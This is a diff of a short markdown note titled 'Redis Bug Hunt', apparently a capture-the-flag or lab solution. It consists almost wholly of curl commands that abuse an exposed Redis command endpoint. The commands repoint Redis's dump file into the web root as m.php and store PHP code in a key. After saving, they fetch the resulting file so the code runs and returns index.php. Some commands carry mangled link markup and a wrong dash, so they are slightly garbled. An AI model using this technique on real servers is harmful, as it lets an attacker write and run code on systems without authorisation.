@@ -1,7 +1,15 @@
+# Redis Bug Hunt
+The objective is to retrieve the index.php file from the server.
 
+This can be done using these commands:
 
+    curl [http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html](http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html)
+    curl http://localhost/maintenance.php?cmd=config,set,dbfilename,m.php
+    curl '[http://localhost/maintenance.php?cmd=set,test](http://localhost/maintenance.php?cmd=set,test),<?php%20phpinfo();%20?>'
+curl '[http://localhost/maintenance.php?cmd=set,test](http://localhost/maintenance.php?cmd=set,test),<?php%20echo%20file_get_contents("index.php");%20?>'
+curl http://localhost/maintenance.php?cmd=save
+curl [http://localhost/](http://localhost/m.php)[m](http://localhost/m.php)[.php](http://localhost/m.php) –output -
 
-> Written with [StackEdit](https://stackedit.io/).
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbNzMwOTk4MTE2XX0=
+eyJoaXN0b3J5IjpbLTExMjI2ODExOSw3MzA5OTgxMTZdfQ==
 -->
